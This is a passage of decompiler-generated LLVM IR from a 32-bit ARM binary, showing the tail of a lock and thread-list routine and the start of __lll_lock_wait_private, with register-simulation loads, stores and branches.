  %v1_15100 = inttoptr i32 %v0_150fc to i32*
  %v2_15100 = load i32, i32* %v1_15100, align 4
  store i32 %v2_15100, i32* %r7.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_15104 = icmp eq i32 %v2_15100, 0
  store i32 %v2_150f8, i32* %r5.global-to-local, align 4
  br i1 %v2_15104, label %dec_label_pc_15170.loopexit, label %dec_label_pc_15118

dec_label_pc_15118:                               ; preds = %bb72
  %v1_15118 = add i32 %v2_15100, 20
  store i32 %v1_15118, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_1511c

dec_label_pc_1511c:                               ; preds = %dec_label_pc_15150.dec_label_pc_1511c_crit_edge, %dec_label_pc_15118
  %v0_15120 = phi i32 [ %v0_15120.pre, %dec_label_pc_15150.dec_label_pc_1511c_crit_edge ], [ %v1_15118, %dec_label_pc_15118 ]
  %v0_1511c = phi i32 [ %v0_1511c.pre, %dec_label_pc_15150.dec_label_pc_1511c_crit_edge ], [ %v2_15100, %dec_label_pc_15118 ]
  %v1_1511c = add i32 %v0_1511c, 20
  %v2_1511c = inttoptr i32 %v1_1511c to i32*
  %v3_1511c = load i32, i32* %v2_1511c, align 4
  store i32 %v0_15120, i32* %r2.global-to-local, align 4
  store i32 %v3_1511c, i32* %r4.global-to-local, align 4
  %v1_1512c119 = inttoptr i32 %v0_15120 to i32*
  %v2_1512c120 = load i32, i32* %v1_1512c119, align 4
  store i32 %v2_1512c120, i32* %r3.global-to-local, align 4
  %v3_15130122 = icmp uge i32 %v2_1512c120, %v3_1511c
  store i1 %v3_15130122, i1* %cpsr_c.global-to-local, align 1
  %v9_15130128 = icmp eq i32 %v2_1512c120, %v3_1511c
  br i1 %v9_15130128, label %dec_label_pc_15138, label %dec_label_pc_15150

dec_label_pc_15138:                               ; preds = %dec_label_pc_1511c, %dec_label_pc_15138.dec_label_pc_1512c_crit_edge
  %v0_15138129 = phi i32 [ %v1_15130.pre, %dec_label_pc_15138.dec_label_pc_1512c_crit_edge ], [ %v3_1511c, %dec_label_pc_1511c ]
  store i32 %v0_15138129, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_15148 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_15148, label %dec_label_pc_1514c, label %dec_label_pc_15138.dec_label_pc_1512c_crit_edge

dec_label_pc_15138.dec_label_pc_1512c_crit_edge:  ; preds = %dec_label_pc_15138
  %v0_1512c.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_15130.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_1512c = inttoptr i32 %v0_1512c.pre to i32*
  %v2_1512c = load i32, i32* %v1_1512c, align 4
  store i32 %v2_1512c, i32* %r3.global-to-local, align 4
  %v3_15130 = icmp uge i32 %v2_1512c, %v1_15130.pre
  store i1 %v3_15130, i1* %cpsr_c.global-to-local, align 1
  %v9_15130 = icmp eq i32 %v2_1512c, %v1_15130.pre
  br i1 %v9_15130, label %dec_label_pc_15138, label %dec_label_pc_15150

dec_label_pc_1514c:                               ; preds = %dec_label_pc_15138
  %v0_1514c = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_1514c, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_15150

dec_label_pc_15150:                               ; preds = %dec_label_pc_1511c, %dec_label_pc_15138.dec_label_pc_1512c_crit_edge, %dec_label_pc_1514c
  %v0_15150 = phi i32 [ %v0_1514c, %dec_label_pc_1514c ], [ %v2_1512c120, %dec_label_pc_1511c ], [ %v2_1512c, %dec_label_pc_15138.dec_label_pc_1512c_crit_edge ]
  %v1_15150 = phi i32 [ %v0_1514c, %dec_label_pc_1514c ], [ %v3_1511c, %dec_label_pc_1511c ], [ %v1_15130.pre, %dec_label_pc_15138.dec_label_pc_1512c_crit_edge ]
  %v3_15150 = icmp uge i32 %v0_15150, %v1_15150
  store i1 %v3_15150, i1* %cpsr_c.global-to-local, align 1
  %v9_15150 = icmp eq i32 %v0_15150, %v1_15150
  store i32 %v2_150f8, i32* %r4.global-to-local, align 4
  br i1 %v9_15150, label %dec_label_pc_150e8, label %dec_label_pc_15150.dec_label_pc_1511c_crit_edge

dec_label_pc_15150.dec_label_pc_1511c_crit_edge:  ; preds = %dec_label_pc_15150
  %v0_1511c.pre = load i32, i32* %r7.global-to-local, align 4
  %v0_15120.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_1511c

dec_label_pc_1516c:                               ; preds = %dec_label_pc_15160.backedge, %entry
  %v0_1517431 = phi i32 [ ptrtoint (i32* @global_var_23010.366 to i32), %entry ], [ %v0_15160, %dec_label_pc_15160.backedge ]
  store i32 0, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_15170

dec_label_pc_15170.loopexit:                      ; preds = %bb72
  store i32 %v2_150f8, i32* %r6.global-to-local, align 4
  %v0_15174.pre = load i32, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_15170

dec_label_pc_15170:                               ; preds = %dec_label_pc_15170.loopexit, %dec_label_pc_1516c
  %v0_15174 = phi i32 [ %v0_15174.pre, %dec_label_pc_15170.loopexit ], [ %v0_1517431, %dec_label_pc_1516c ]
  store i32 152, i32* %r3.global-to-local, align 4
  %v2_15174 = add i32 %v0_15174, 152
  %v3_15174 = inttoptr i32 %v2_15174 to i32*
  %v4_15174 = load i32, i32* %v3_15174, align 4
  store i32 %v4_15174, i32* %r7.global-to-local, align 4
  %v0_15178 = call i32 @__aeabi_read_tp()
  store i32 %v0_15178, i32* %r0.global-to-local, align 4
  %v1_1517c = add i32 %v4_15174, 8
  %v2_1517c = inttoptr i32 %v1_1517c to i32*
  %v3_1517c = load i32, i32* %v2_1517c, align 4
  store i32 %v3_1517c, i32* %r3.global-to-local, align 4
  %v1_15180 = add i32 %v0_15178, -1168
  store i32 %v1_15180, i32* %r5.global-to-local, align 4
  %v3_15184 = icmp uge i32 %v3_1517c, %v1_15180
  store i1 %v3_15184, i1* %cpsr_c.global-to-local, align 1
  %v9_15184 = icmp eq i32 %v3_1517c, %v1_15180
  br i1 %v9_15184, label %dec_label_pc_152ec, label %dec_label_pc_1518c

dec_label_pc_1518c:                               ; preds = %dec_label_pc_15170
  store i32 %v4_15174, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  %v1_15198112 = inttoptr i32 %v4_15174 to i32*
  %v2_15198113 = load i32, i32* %v1_15198112, align 4
  store i32 %v2_15198113, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v9_1519c115 = icmp eq i32 %v2_15198113, 0
  br i1 %v9_1519c115, label %dec_label_pc_151a4, label %dec_label_pc_151bc

dec_label_pc_151a4:                               ; preds = %dec_label_pc_1518c, %dec_label_pc_151a4.dec_label_pc_15198_crit_edge
  %v0_151a4116 = phi i32 [ %v1_1519c.pre, %dec_label_pc_151a4.dec_label_pc_15198_crit_edge ], [ 0, %dec_label_pc_1518c ]
  store i32 %v0_151a4116, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_151b4 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_151b4, label %dec_label_pc_151b8, label %dec_label_pc_151a4.dec_label_pc_15198_crit_edge

dec_label_pc_151a4.dec_label_pc_15198_crit_edge:  ; preds = %dec_label_pc_151a4
  %v0_15198.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_1519c.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_15198 = inttoptr i32 %v0_15198.pre to i32*
  %v2_15198 = load i32, i32* %v1_15198, align 4
  store i32 %v2_15198, i32* %r3.global-to-local, align 4
  %v3_1519c = icmp uge i32 %v2_15198, %v1_1519c.pre
  store i1 %v3_1519c, i1* %cpsr_c.global-to-local, align 1
  %v9_1519c = icmp eq i32 %v2_15198, %v1_1519c.pre
  br i1 %v9_1519c, label %dec_label_pc_151a4, label %dec_label_pc_151bc

dec_label_pc_151b8:                               ; preds = %dec_label_pc_151a4
  %v0_151b8 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_151b8, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_151bc

dec_label_pc_151bc:                               ; preds = %dec_label_pc_1518c, %dec_label_pc_151a4.dec_label_pc_15198_crit_edge, %dec_label_pc_151b8
  %v0_151bc = phi i32 [ %v0_151b8, %dec_label_pc_151b8 ], [ %v2_15198113, %dec_label_pc_1518c ], [ %v2_15198, %dec_label_pc_151a4.dec_label_pc_15198_crit_edge ]
  %v1_151bc = phi i32 [ %v0_151b8, %dec_label_pc_151b8 ], [ 0, %dec_label_pc_1518c ], [ %v1_1519c.pre, %dec_label_pc_151a4.dec_label_pc_15198_crit_edge ]
  %v3_151bc = icmp uge i32 %v0_151bc, %v1_151bc
  store i1 %v3_151bc, i1* %cpsr_c.global-to-local, align 1
  %v9_151bc = icmp eq i32 %v0_151bc, %v1_151bc
  br i1 %v9_151bc, label %bb74, label %bb73

bb73:                                             ; preds = %dec_label_pc_151bc
  %v1_151c0 = load i32, i32* %r7.global-to-local, align 4
  store i32 %v1_151c0, i32* %r0.global-to-local, align 4
  br label %bb74

bb74:                                             ; preds = %dec_label_pc_151bc, %bb73
  %v1_151c4 = xor i1 %v9_151bc, true
  call void @__pseudo_cond_branch(i1 %v1_151c4, i32 ptrtoint (i32* @global_var_1543c.528 to i32))
  %v0_151c8 = load i32, i32* %r5.global-to-local, align 4
  %v1_151c8 = load i32, i32* %r7.global-to-local, align 4
  %v2_151c8 = add i32 %v1_151c8, 8
  %v3_151c8 = inttoptr i32 %v2_151c8 to i32*
  store i32 %v0_151c8, i32* %v3_151c8, align 4
  br label %dec_label_pc_152ec

dec_label_pc_152ec:                               ; preds = %bb74, %dec_label_pc_15170
  store i32 152, i32* %r3.global-to-local, align 4
  %v0_151d0 = load i32, i32* %r8.global-to-local, align 4
  %v2_151d0 = add i32 %v0_151d0, 152
  %v3_151d0 = inttoptr i32 %v2_151d0 to i32*
  %v4_151d0 = load i32, i32* %v3_151d0, align 4
  store i32 %v4_151d0, i32* %r2.global-to-local, align 4
  %v1_151d4 = add i32 %v4_151d0, 4
  %v2_151d4 = inttoptr i32 %v1_151d4 to i32*
  %v3_151d4 = load i32, i32* %v2_151d4, align 4
  %v1_151d8 = add i32 %v3_151d4, 1
  store i32 %v1_151d8, i32* %r3.global-to-local, align 4
  store i32 %v1_151d8, i32* %v2_151d4, align 4
  %v0_151e0 = load i32, i32* %r5.global-to-local, align 4
  %v1_151e0 = add i32 %v0_151e0, 108
  %v2_151e0 = inttoptr i32 %v1_151e0 to i32*
  %v3_151e0 = load i32, i32* %v2_151e0, align 4
  store i32 %v3_151e0, i32* %sl.global-to-local, align 4
  store i32 0, i32* @r1, align 4
  %v1_151e8 = sub i32 0, %v3_151e0
  store i32 %v1_151e8, i32* %v2_151e0, align 4
  store i32 18874385, i32* %r0.global-to-local, align 4
  %v0_151fc = load i32, i32* %r5.global-to-local, align 4
  %v1_151fc = add i32 %v0_151fc, 104
  store i32 %v1_151fc, i32* %r4.global-to-local, align 4
  store i32 120, i32* %r7.global-to-local, align 4
  store i32 18874385, i32* %r2.global-to-local, align 4
  store i32 18874385, i32* %sb.global-to-local, align 4
  %v0_152f0.pre = load i32, i32* %sl.global-to-local, align 4
  store i32 152, i32* %r3.global-to-local, align 4
  %v2_152f0 = add i32 %v0_151fc, 108
  %v3_152f0 = inttoptr i32 %v2_152f0 to i32*
  store i32 %v0_152f0.pre, i32* %v3_152f0, align 4
  %v0_152f4 = load i32, i32* %r8.global-to-local, align 4
  %v1_152f4 = load i32, i32* %r3.global-to-local, align 4
  %v2_152f4 = add i32 %v1_152f4, %v0_152f4
  %v3_152f4 = inttoptr i32 %v2_152f4 to i32*
  %v4_152f4 = load i32, i32* %v3_152f4, align 4
  store i32 %v4_152f4, i32* %r0.global-to-local, align 4
  %v1_152f8 = add i32 %v4_152f4, 4
  %v2_152f8 = inttoptr i32 %v1_152f8 to i32*
  %v3_152f8 = load i32, i32* %v2_152f8, align 4
  %v1_152fc = add i32 %v3_152f8, -1
  store i32 %v1_152fc, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_15300 = icmp eq i32 %v1_152fc, 0
  store i32 %v1_152fc, i32* %v2_152f8, align 4
  br i1 %v2_15300, label %dec_label_pc_1530c, label %dec_label_pc_153fcthread-pre-split

dec_label_pc_1530c:                               ; preds = %dec_label_pc_152ec
  %v0_1530c = load i32, i32* %r3.global-to-local, align 4
  %v1_1530c = load i32, i32* %r0.global-to-local, align 4
  %v2_1530c = add i32 %v1_1530c, 8
  %v3_1530c = inttoptr i32 %v2_1530c to i32*
  store i32 %v0_1530c, i32* %v3_1530c, align 4
  %v0_15310 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_15310, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_15314

dec_label_pc_15314:                               ; preds = %dec_label_pc_15344.dec_label_pc_15314_crit_edge, %dec_label_pc_1530c
  %v0_15314 = phi i32 [ %v0_15314.pre, %dec_label_pc_15344.dec_label_pc_15314_crit_edge ], [ %v0_15310, %dec_label_pc_1530c ]
  %v1_15314 = inttoptr i32 %v0_15314 to i32*
  %v2_15314 = load i32, i32* %v1_15314, align 4
  store i32 %v2_15314, i32* %r4.global-to-local, align 4
  store i32 0, i32* @r1, align 4
  store i32 %v0_15314, i32* %r2.global-to-local, align 4
  %v2_15320100 = load i32, i32* %v1_15314, align 4
  store i32 %v2_15320100, i32* %r3.global-to-local, align 4
  %v3_15324102 = icmp uge i32 %v2_15320100, %v2_15314
  store i1 %v3_15324102, i1* %cpsr_c.global-to-local, align 1
  %v9_15324108 = icmp eq i32 %v2_15320100, %v2_15314
  br i1 %v9_15324108, label %dec_label_pc_1532c, label %dec_label_pc_15344

dec_label_pc_1532c:                               ; preds = %dec_label_pc_15314, %dec_label_pc_1532c.dec_label_pc_15320_crit_edge
  %v0_1532c109 = phi i32 [ %v1_15324.pre, %dec_label_pc_1532c.dec_label_pc_15320_crit_edge ], [ %v2_15314, %dec_label_pc_15314 ]
  store i32 %v0_1532c109, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_1533c = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_1533c, label %dec_label_pc_15340, label %dec_label_pc_1532c.dec_label_pc_15320_crit_edge

dec_label_pc_1532c.dec_label_pc_15320_crit_edge:  ; preds = %dec_label_pc_1532c
  %v0_15320.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_15324.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_15320 = inttoptr i32 %v0_15320.pre to i32*
  %v2_15320 = load i32, i32* %v1_15320, align 4
  store i32 %v2_15320, i32* %r3.global-to-local, align 4
  %v3_15324 = icmp uge i32 %v2_15320, %v1_15324.pre
  store i1 %v3_15324, i1* %cpsr_c.global-to-local, align 1
  %v9_15324 = icmp eq i32 %v2_15320, %v1_15324.pre
  br i1 %v9_15324, label %dec_label_pc_1532c, label %dec_label_pc_15344

dec_label_pc_15340:                               ; preds = %dec_label_pc_1532c
  %v0_15340 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_15340, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_15344

dec_label_pc_15344:                               ; preds = %dec_label_pc_15314, %dec_label_pc_1532c.dec_label_pc_15320_crit_edge, %dec_label_pc_15340
  %v0_1534c = phi i32 [ %v0_15340, %dec_label_pc_15340 ], [ %v2_15320100, %dec_label_pc_15314 ], [ %v2_15320, %dec_label_pc_1532c.dec_label_pc_15320_crit_edge ]
  %v1_15344 = phi i32 [ %v0_15340, %dec_label_pc_15340 ], [ %v2_15314, %dec_label_pc_15314 ], [ %v1_15324.pre, %dec_label_pc_1532c.dec_label_pc_15320_crit_edge ]
  %v3_15344 = icmp uge i32 %v0_1534c, %v1_15344
  store i1 %v3_15344, i1* %cpsr_c.global-to-local, align 1
  %v9_15344 = icmp eq i32 %v0_1534c, %v1_15344
  br i1 %v9_15344, label %dec_label_pc_1534c, label %dec_label_pc_15344.dec_label_pc_15314_crit_edge

dec_label_pc_15344.dec_label_pc_15314_crit_edge:  ; preds = %dec_label_pc_15344
  %v0_15314.pre = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_15314

dec_label_pc_1534c:                               ; preds = %dec_label_pc_15344
  %v2_1534c = icmp ne i32 %v1_15344, 0
  store i1 %v2_1534c, i1* %cpsr_c.global-to-local, align 1
  %v7_15350 = icmp slt i32 %v1_15344, 2
  br i1 %v7_15350, label %dec_label_pc_153fcthread-pre-split, label %dec_label_pc_15354

dec_label_pc_15354:                               ; preds = %dec_label_pc_1534c
  %v0_15354 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_15354, i32* %r0.global-to-local, align 4
  %v0_15358 = load i32, i32* @r1, align 4
  %v1_15358 = add i32 %v0_15358, 129
  store i32 %v1_15358, i32* @r1, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 240, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_153fcthread-pre-split

dec_label_pc_15370:                               ; preds = %dec_label_pc_153fcthread-pre-split, %dec_label_pc_153f8
  %v0_15370 = phi i32 [ %v3_153f8, %dec_label_pc_153f8 ], [ %v0_153fc.pr, %dec_label_pc_153fcthread-pre-split ]
  %v1_15370 = inttoptr i32 %v0_15370 to i32*
  %v2_15370 = load i32, i32* %v1_15370, align 4
  store i32 %v2_15370, i32* %r3.global-to-local, align 4
  %v1_15374 = add i32 %v2_15370, 8
  %v2_15374 = inttoptr i32 %v1_15374 to i32*
  %v3_15374 = load i32, i32* %v2_15374, align 4
  store i32 %v3_15374, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_15378 = icmp eq i32 %v3_15374, 0
  br i1 %v2_15378, label %bb76, label %bb75

bb75:                                             ; preds = %dec_label_pc_15370
  br label %bb76

bb76:                                             ; preds = %dec_label_pc_15370, %bb75
  %v2_15380 = xor i1 %v2_15378, true
  call void @__pseudo_cond_branch(i1 %v2_15380, i32 %v3_15374)
  %v0_15384 = load i32, i32* %r6.global-to-local, align 4
  %v1_15384 = inttoptr i32 %v0_15384 to i32*
  %v2_15384 = load i32, i32* %v1_15384, align 4
  store i32 %v2_15384, i32* %r5.global-to-local, align 4
  %v1_15388 = add i32 %v2_15384, 20
  store i32 %v1_15388, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_1538c

dec_label_pc_1538c:                               ; preds = %dec_label_pc_153c0.dec_label_pc_1538c_crit_edge, %bb76
  %v0_15390 = phi i32 [ %v0_15390.pre, %dec_label_pc_153c0.dec_label_pc_1538c_crit_edge ], [ %v1_15388, %bb76 ]
  %v0_1538c = phi i32 [ %v0_1538c.pre, %dec_label_pc_153c0.dec_label_pc_1538c_crit_edge ], [ %v2_15384, %bb76 ]
  %v1_1538c = add i32 %v0_1538c, 20
  %v2_1538c = inttoptr i32 %v1_1538c to i32*
  %v3_1538c = load i32, i32* %v2_1538c, align 4
  store i32 %v0_15390, i32* %r2.global-to-local, align 4
  store i32 %v3_1538c, i32* %r4.global-to-local, align 4
  %v1_15398 = add i32 %v3_1538c, -1
  store i32 %v1_15398, i32* @r1, align 4
  %v1_1539c87 = inttoptr i32 %v0_15390 to i32*
  %v2_1539c88 = load i32, i32* %v1_1539c87, align 4
  store i32 %v2_1539c88, i32* %r3.global-to-local, align 4
  %v3_153a090 = icmp uge i32 %v2_1539c88, %v3_1538c
  store i1 %v3_153a090, i1* %cpsr_c.global-to-local, align 1
  %v9_153a096 = icmp eq i32 %v2_1539c88, %v3_1538c
  br i1 %v9_153a096, label %dec_label_pc_153a8, label %dec_label_pc_153c0

dec_label_pc_153a8:                               ; preds = %dec_label_pc_1538c, %dec_label_pc_153a8.dec_label_pc_1539c_crit_edge
  %v0_153a897 = phi i32 [ %v1_153a0.pre, %dec_label_pc_153a8.dec_label_pc_1539c_crit_edge ], [ %v3_1538c, %dec_label_pc_1538c ]
  store i32 %v0_153a897, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_153b8 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_153b8, label %dec_label_pc_153bc, label %dec_label_pc_153a8.dec_label_pc_1539c_crit_edge

dec_label_pc_153a8.dec_label_pc_1539c_crit_edge:  ; preds = %dec_label_pc_153a8
  %v0_1539c.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_153a0.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_1539c = inttoptr i32 %v0_1539c.pre to i32*
  %v2_1539c = load i32, i32* %v1_1539c, align 4
  store i32 %v2_1539c, i32* %r3.global-to-local, align 4
  %v3_153a0 = icmp uge i32 %v2_1539c, %v1_153a0.pre
  store i1 %v3_153a0, i1* %cpsr_c.global-to-local, align 1
  %v9_153a0 = icmp eq i32 %v2_1539c, %v1_153a0.pre
  br i1 %v9_153a0, label %dec_label_pc_153a8, label %dec_label_pc_153c0

dec_label_pc_153bc:                               ; preds = %dec_label_pc_153a8
  %v0_153bc = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_153bc, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_153c0

dec_label_pc_153c0:                               ; preds = %dec_label_pc_1538c, %dec_label_pc_153a8.dec_label_pc_1539c_crit_edge, %dec_label_pc_153bc
  %v0_153cc = phi i32 [ %v0_153bc, %dec_label_pc_153bc ], [ %v2_1539c88, %dec_label_pc_1538c ], [ %v2_1539c, %dec_label_pc_153a8.dec_label_pc_1539c_crit_edge ]
  %v1_153c0 = phi i32 [ %v0_153bc, %dec_label_pc_153bc ], [ %v3_1538c, %dec_label_pc_1538c ], [ %v1_153a0.pre, %dec_label_pc_153a8.dec_label_pc_1539c_crit_edge ]
  %v3_153c0 = icmp uge i32 %v0_153cc, %v1_153c0
  store i1 %v3_153c0, i1* %cpsr_c.global-to-local, align 1
  %v9_153c0 = icmp eq i32 %v0_153cc, %v1_153c0
  store i32 %v0_153cc, i32* %r2.global-to-local, align 4
  br i1 %v9_153c0, label %dec_label_pc_153cc, label %dec_label_pc_153c0.dec_label_pc_1538c_crit_edge

dec_label_pc_153c0.dec_label_pc_1538c_crit_edge:  ; preds = %dec_label_pc_153c0
  %v0_1538c.pre = load i32, i32* %r5.global-to-local, align 4
  %v0_15390.pre = load i32, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_1538c

dec_label_pc_153cc:                               ; preds = %dec_label_pc_153c0
  %v2_153cc = icmp ne i32 %v1_153c0, 0
  store i1 %v2_153cc, i1* %cpsr_c.global-to-local, align 1
  %v7_153cc = icmp eq i32 %v1_153c0, 1
  %v0_153d4 = load i32, i32* %r6.global-to-local, align 4
  br i1 %v7_153cc, label %dec_label_pc_153d4, label %dec_label_pc_153f8

dec_label_pc_153d4:                               ; preds = %dec_label_pc_153cc
  %v1_153d4 = inttoptr i32 %v0_153d4 to i32*
  %v2_153d4 = load i32, i32* %v1_153d4, align 4
  store i32 %v2_153d4, i32* @r1, align 4
  %v1_153d8 = add i32 %v2_153d4, 24
  %v2_153d8 = inttoptr i32 %v1_153d8 to i32*
  %v3_153d8 = load i32, i32* %v2_153d8, align 4
  store i32 %v3_153d8, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_153dc = icmp eq i32 %v3_153d8, 0
  br i1 %v2_153dc, label %dec_label_pc_153f8, label %dec_label_pc_153e4

dec_label_pc_153e4:                               ; preds = %dec_label_pc_153d4
  %v1_153e4 = add i32 %v2_153d4, 20
  %v2_153e4 = inttoptr i32 %v1_153e4 to i32*
  %v3_153e4 = load i32, i32* %v2_153e4, align 4
  store i32 %v3_153e4, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 129, i32* @r1, align 4
  store i32 240, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_153f8

dec_label_pc_153f8:                               ; preds = %dec_label_pc_153cc, %dec_label_pc_153e4, %dec_label_pc_153d4
  %v1_153f8 = add i32 %v0_153d4, 4
  %v2_153f8 = inttoptr i32 %v1_153f8 to i32*
  %v3_153f8 = load i32, i32* %v2_153f8, align 4
  store i32 %v3_153f8, i32* %r6.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_153fc = icmp eq i32 %v3_153f8, 0
  br i1 %v2_153fc, label %dec_label_pc_15404, label %dec_label_pc_15370

dec_label_pc_153fcthread-pre-split:               ; preds = %dec_label_pc_15354, %dec_label_pc_1534c, %dec_label_pc_152ec
  %v0_153fc.pr = load i32, i32* %r6.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_153fc11 = icmp eq i32 %v0_153fc.pr, 0
  br i1 %v2_153fc11, label %dec_label_pc_15404, label %dec_label_pc_15370

dec_label_pc_15404:                               ; preds = %dec_label_pc_153f8, %dec_label_pc_153fcthread-pre-split
  %v0_15404.pre = load i32, i32* %sb.global-to-local, align 4
  store i32 %v0_15404.pre, i32* %r0.global-to-local, align 4
  ret i32 %v0_15404.pre

; uselistorder directives
  uselistorder i32 %v0_153fc.pr, { 1, 0 }
  uselistorder i32 %v3_153f8, { 1, 2, 0 }
  uselistorder i32 %v1_153c0, { 1, 0, 2, 3 }
  uselistorder i32 %v0_153bc, { 1, 0, 2 }
  uselistorder i32 %v1_153a0.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v0_15340, { 1, 0, 2 }
  uselistorder i32 %v1_15324.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v0_15314, { 1, 0 }
  uselistorder i32 %v0_151b8, { 1, 0, 2 }
  uselistorder i32 %v1_1519c.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v4_15174, { 2, 1, 0, 3 }
  uselistorder i32 %v0_1514c, { 1, 0, 2 }
  uselistorder i32 %v1_15130.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v2_150f8, { 1, 0, 2 }
  uselistorder i32 %v0_150d8, { 1, 0, 2 }
  uselistorder i32 %v1_150bc.pre, { 0, 3, 2, 1 }
  uselistorder i32* %r8.global-to-local, { 1, 2, 0, 3, 4, 5 }
  uselistorder i32* %r7.global-to-local, { 14, 1, 2, 3, 4, 6, 5, 7, 8, 9, 10, 11, 13, 12, 0 }
  uselistorder i32* %r6.global-to-local, { 3, 7, 5, 6, 4, 0, 1, 2 }
  uselistorder i32* %r5.global-to-local, { 0, 1, 3, 2, 4, 5, 6, 7, 8, 9, 10, 11, 12 }
  uselistorder i32* %r4.global-to-local, { 1, 0, 2, 4, 3, 5, 6, 8, 7, 9, 10, 12, 11, 13, 14, 16, 15, 17 }
  uselistorder i32* %r3.global-to-local, { 34, 5, 6, 8, 7, 0, 9, 10, 11, 12, 14, 13, 1, 15, 16, 17, 18, 19, 20, 21, 23, 22, 2, 24, 25, 26, 28, 27, 4, 29, 30, 32, 31, 3, 33 }
  uselistorder i32* %r0.global-to-local, { 12, 13, 0, 1, 2, 3, 4, 5, 6, 7, 8, 11, 9, 10 }
  uselistorder i1* %cpsr_c.global-to-local, { 2, 13, 7, 8, 9, 11, 10, 0, 12, 14, 15, 17, 16, 1, 18, 19, 21, 20, 4, 22, 23, 25, 24, 6, 26, 27, 28, 30, 29, 5, 32, 31, 3 }
  uselistorder i32 108, { 6, 7, 0, 1, 2, 3, 4, 5 }
  uselistorder label %dec_label_pc_15404, { 1, 0 }
  uselistorder label %dec_label_pc_153f8, { 1, 2, 0 }
  uselistorder label %dec_label_pc_153c0, { 2, 1, 0 }
  uselistorder label %dec_label_pc_153a8, { 1, 0 }
  uselistorder label %bb76, { 1, 0 }
  uselistorder label %dec_label_pc_15344, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1532c, { 1, 0 }
  uselistorder label %bb74, { 1, 0 }
  uselistorder label %dec_label_pc_151bc, { 2, 1, 0 }
  uselistorder label %dec_label_pc_151a4, { 1, 0 }
  uselistorder label %dec_label_pc_15150, { 2, 1, 0 }
  uselistorder label %dec_label_pc_15138, { 1, 0 }
  uselistorder label %bb72, { 1, 0 }
  uselistorder label %dec_label_pc_150dc, { 2, 1, 0 }
  uselistorder label %dec_label_pc_150c4, { 1, 0 }
  uselistorder label %dec_label_pc_15160.backedge, { 1, 0 }
  uselistorder label %dec_label_pc_15090, { 1, 0 }
}

define i32 @__lll_lock_wait_private(i32* %arg1) local_unnamed_addr {
entry:
  %cpsr_c.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_1543c = load i32, i32* @r4, align 4
  store i32 %v3_1543c, i32* %stack_var_-16, align 4
  %v0_15440 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_15440, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_15444

dec_label_pc_15444:                               ; preds = %dec_label_pc_154c4.dec_label_pc_15444_crit_edge, %entry
  %v0_15448 = phi i32 [ %v0_15448.pre, %dec_label_pc_154c4.dec_label_pc_15444_crit_edge ], [ %v0_15440, %entry ]
  store i32 2, i32* %r1.global-to-local, align 4
  store i32 %v0_15448, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r4.global-to-local, align 4
